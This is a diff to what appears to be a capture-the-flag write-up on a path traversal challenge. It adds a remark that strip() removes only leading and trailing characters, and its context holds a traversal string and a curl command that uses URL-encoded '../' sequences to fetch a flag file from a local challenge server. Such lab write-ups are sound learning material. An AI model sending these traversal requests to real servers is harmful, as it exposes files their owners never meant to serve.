@@ -26,6 +26,8 @@ notice these:
 'fortunes/../../../flag'
 ```
 
+`strip()` only remove leading or trailing characters not the pattern.
+
 solution:
 
 `curl -v "http://challenge.localhost:80/content/fortunes%2f..%2f..%2f..%2fflag"`
